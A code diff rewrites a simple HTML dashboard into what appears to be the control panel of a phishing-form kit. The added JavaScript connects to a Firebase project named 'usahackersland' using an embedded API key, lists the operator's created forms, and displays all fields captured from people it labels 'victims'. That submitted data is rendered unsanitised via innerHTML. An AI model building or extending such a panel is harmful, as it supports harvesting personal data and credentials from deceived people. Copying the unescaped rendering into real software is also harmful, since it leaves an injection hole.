@@ -1,113 +1,153 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🎨 Form Builder Dashboard</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <style>
     body {
-      font-family: sans-serif;
-      background: #f0f2f5;
+      font-family: Arial, sans-serif;
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      background: #f0f2f5;
     }
-    .container {
-      max-width: 800px;
-      margin: auto;
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-    }
-    h1 {
+    header {
+      background: #4a90e2;
+      color: white;
+      padding: 15px;
       text-align: center;
     }
-    input[type="file"] {
-      margin-top: 10px;
-      padding: 8px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      width: 100%;
-    }
-    img#dashboardLogo {
-      display: block;
-      margin: 15px auto;
-      max-width: 150px;
+    .container {
+      max-width: 1000px;
+      margin: 30px auto;
+      background: white;
+      padding: 20px;
       border-radius: 10px;
     }
     .section {
-      margin-top: 40px;
+      margin-bottom: 30px;
+    }
+    h2 {
+      margin-top: 0;
+      color: #4a90e2;
+    }
+    .card {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 10px;
+      background: #f9f9f9;
+    }
+    button {
+      background: #4a90e2;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #357ac6;
+    }
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .highlight {
+      font-weight: bold;
+      color: #333;
     }
   </style>
 </head>
 <body>
-
-<div class="container">
-  <h1>📊 Dashboard</h1>
-
-  <!-- ✅ Dashboard Logo -->
-  <div style="text-align:center;">
-    <img id="dashboardLogo" src="logo.png" alt="Dashboard Logo" />
-    <div id="adminUpload" style="display:none;">
-      <label for="dashboardLogoInput"><strong>Upload Dashboard Logo</strong></label>
-      <input type="file" id="dashboardLogoInput" accept="image/*" />
+  <header>
+    <div class="topbar">
+      <h1>🎨 Form Builder Dashboard</h1>
+      <button onclick="logout()">Logout</button>
     </div>
-  </div>
-
-  <!-- ✅ Dashboard Menu -->
-  <div class="section">
-    <h2>🔧 Tools</h2>
-    <ul>
-      <li><a href="index.html">🧰 Form Builder</a></li>
-      <li><a href="forms.html">📁 My Created Forms</a></li>
-      <li><a href="feedback.html">💬 Form Submissions</a></li>
-    </ul>
-  </div>
-
-  <div class="section">
-    <h2>📌 Tips</h2>
-    <p>Make sure your forms are saved and tested. Use the builder to add logos, banners, input fields, and more.</p>
-  </div>
+  </header>  <div class="container">
+    <div class="section">
+      <h2>📋 Your Created Forms</h2>
+      <div id="formsList">Loading forms...</div>
+    </div><div class="section">
+  <h2>🕵️ Victims / Submissions</h2>
+  <div id="victimsList">Loading victims...</div>
 </div>
 
-<!-- ✅ Firebase Auth to check for admin -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+  </div>  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+      authDomain: "usahackersland.firebaseapp.com",
+      projectId: "usahackersland",
+      storageBucket: "usahackersland.appspot.com",
+      messagingSenderId: "588407428267",
+      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
 
-  const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "YOUR_PROJECT.firebaseapp.com",
-    projectId: "YOUR_PROJECT_ID",
-    storageBucket: "YOUR_PROJECT.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
-  };
+    let currentUserEmail = "";
 
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
+    auth.onAuthStateChanged(user => {
+      if (user) {
+        currentUserEmail = user.email;
+        loadForms();
+        loadVictims();
+      } else {
+        alert("You must log in first.");
+        location.href = "login.html";
+      }
+    });
 
-  const adminEmail = "admin@example.com"; // ✅ Replace this with your admin email
-  const dashboardLogoInput = document.getElementById('dashboardLogoInput');
-  const dashboardLogo = document.getElementById('dashboardLogo');
-  const adminUpload = document.getElementById('adminUpload');
-
-  onAuthStateChanged(auth, user => {
-    if (user && user.email === adminEmail) {
-      adminUpload.style.display = "block";
+    function logout() {
+      auth.signOut().then(() => location.href = "login.html");
     }
-  });
 
-  dashboardLogoInput?.addEventListener("change", function () {
-    const file = this.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = function (e) {
-        dashboardLogo.src = e.target.result;
-      };
-      reader.readAsDataURL(file);
+    function loadForms() {
+      db.collection("forms").where("createdBy", "==", currentUserEmail).get().then(snapshot => {
+        const container = document.getElementById("formsList");
+        container.innerHTML = "";
+        if (snapshot.empty) {
+          container.innerHTML = "<p>No forms found.</p>";
+          return;
+        }
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          const div = document.createElement("div");
+          div.className = "card";
+          div.innerHTML = `
+            <p><span class="highlight">Title:</span> ${data.title || 'No title'}</p>
+            <p><span class="highlight">Created:</span> ${new Date(data.createdAt).toLocaleString()}</p>
+            <p><span class="highlight">Link:</span> <a href="form.html?id=${doc.id}" target="_blank">Open Form</a></p>
+          `;
+          container.appendChild(div);
+        });
+      });
     }
-  });
-</script>
 
-</body>
+    function loadVictims() {
+      db.collection("victims").where("formOwner", "==", currentUserEmail).get().then(snapshot => {
+        const container = document.getElementById("victimsList");
+        container.innerHTML = "";
+        if (snapshot.empty) {
+          container.innerHTML = "<p>No victim submissions yet.</p>";
+          return;
+        }
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          const div = document.createElement("div");
+          div.className = "card";
+          div.innerHTML = `
+            <p><span class="highlight">Date:</span> ${new Date(data.createdAt).toLocaleString()}</p>
+            <p><span class="highlight">Submitted:</span> ${Object.keys(data).map(k => `${k}: ${data[k]}`).join("<br>")}</p>
+          `;
+          container.appendChild(div);
+        });
+      });
+    }
+  </script></body>
 </html>
